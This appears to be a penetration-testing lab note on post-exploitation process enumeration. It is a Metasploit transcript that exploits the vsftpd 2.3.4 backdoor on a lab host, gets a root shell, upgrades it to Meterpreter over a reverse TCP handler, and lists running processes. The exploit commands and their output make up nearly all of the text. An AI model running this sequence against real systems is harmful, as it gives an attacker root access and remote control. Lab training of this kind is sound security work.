# Enumerating Processes and Cron Jobs

<figure><img src="../../.gitbook/assets/Screenshot_20240117_194358.png" alt=""><figcaption></figcaption></figure>

```sh
msf5 > setg rhosts 192.144.184.3
rhosts => 192.144.184.3
msf5 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.144.184.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.144.184.3:21 - USER: 331 Please specify the password.
[+] 192.144.184.3:21 - Backdoor service has been spawned, handling...
[+] 192.144.184.3:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.144.184.2:38877 -> 192.144.184.3:6200) at 2024-01-17 14:17:28 +0000

^Z
Background session 1? [y/N]  y
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.144.184.2:4433 
[*] Sending stage (985320 bytes) to 192.144.184.3
[*] Meterpreter session 2 opened (192.144.184.2:4433 -> 192.144.184.3:38868) at 2024-01-17 14:18:11 +0000
[*] Command stager progress: 100.00% (773/773 bytes)
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > sessions 2
[*] Starting interaction with 2...

meterpreter > 
```

```sh
meterpreter > ps

Process List
============

 PID  PPID  Name    Arch    User    Path
 ---  ----  ----    ----    ----    ----
 1    0     sh      x86     root    /bin
 7    1     vsftpd  x86     root    /usr/local/sbin
 8    7     sh      x86     root    /bin
 9    8     vsftpd  x86_64  nobody  .
 17   8     qrWlE   x86_64  root    /tmp
```
